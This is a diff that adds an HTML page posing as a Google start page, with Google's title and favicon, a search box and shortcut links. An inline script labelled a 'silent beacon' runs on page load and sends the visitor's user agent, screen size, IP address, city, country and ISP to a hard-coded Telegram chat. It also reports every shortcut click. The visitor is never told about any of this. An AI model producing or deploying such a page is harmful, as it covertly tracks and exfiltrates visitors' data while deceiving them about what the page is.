@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <!-- Favicon do Google -->
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: url('https://i.imgur.com/8gJtz0m.png') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            height: 100vh;
+            backdrop-filter: blur(2px);
+        }
+        
+        .search-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+        
+        .search-container input {
+            width: 100%;
+            padding: 16px 24px;
+            font-size: 18px;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .search-container input:focus {
+            outline: none;
+            background: white;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .search-container input::placeholder {
+            color: #888;
+        }
+        
+        .shortcuts {
+            position: fixed;
+            bottom: 30px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            padding: 10px;
+        }
+        
+        .shortcuts a {
+            color: white;
+            text-decoration: none;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 8px 20px;
+            border-radius: 25px;
+            backdrop-filter: blur(8px);
+            font-size: 14px;
+            transition: 0.3s;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .shortcuts a:hover {
+            background: rgba(0, 120, 212, 0.8);
+            border-color: #0078d4;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="search-container">
+        <form method="get" action="https://www.google.com/search">
+            <input type="text" name="q" placeholder="🔍 Pesquisar no Google...">
+        </form>
+    </div>
+    
+    <div class="shortcuts">
+        <a href="https://www.youtube.com" class="trackable" data-name="YouTube">YouTube</a>
+        <a href="https://www.gmail.com" class="trackable" data-name="Gmail">Gmail</a>
+        <a href="https://github.com" class="trackable" data-name="GitHub">GitHub</a>
+        <a href="https://www.reddit.com" class="trackable" data-name="Reddit">Reddit</a>
+    </div>
+
+    <script>
+        // ===============================================
+        // CONFIGURAÇÃO SEGURA DO TELEGRAM (BEACON SILENCIOSO)
+        // ===============================================
+        const TELEGRAM_TOKEN = '__TELEGRAM_TOKEN__';
+        const CHAT_ID = '8508300977';
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === '__TELEGRAM_TOKEN__') {
+                console.warn('Token do Telegram não configurado.');
+                return;
+            }
+            fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            }).catch(e => console.error('Erro Telegram:', e));
+        }
+
+        // ===============================================
+        // BEACON SILENCIOSO + GEOLOCALIZAÇÃO POR IP
+        // ===============================================
+        (function() {
+            const msg = `🟢 *Visita ao Site*\n` +
+                        `📅 ${new Date().toLocaleString('pt-BR')}\n` +
+                        `🖥️ ${navigator.userAgent}\n` +
+                        `📐 ${screen.width}x${screen.height}`;
+            sendTelegramMessage(msg);
+            
+            // Geolocalização por IP (passiva)
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    const ip = data.ip;
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(r => r.json())
+                        .then(geo => {
+                            if (!geo.error) {
+                                const geoMsg = `🌍 *Localização do Visitante*\n📍 ${geo.city}, ${geo.country_name}\n🏢 ${geo.org}\n🔢 IP: ${ip}`;
+                                sendTelegramMessage(geoMsg);
+                            }
+                        });
+                });
+        })();
+
+        // ===============================================
+        // LOG DE CLIQUES NOS ATALHOS (PASSIVO)
+        // ===============================================
+        document.querySelectorAll('.trackable').forEach(link => {
+            link.addEventListener('click', function() {
+                const name = this.getAttribute('data-name');
+                sendTelegramMessage(`🔗 *Atalho clicado:* ${name}`);
+            });
+        });
+    </script>
+</body>
+</html>
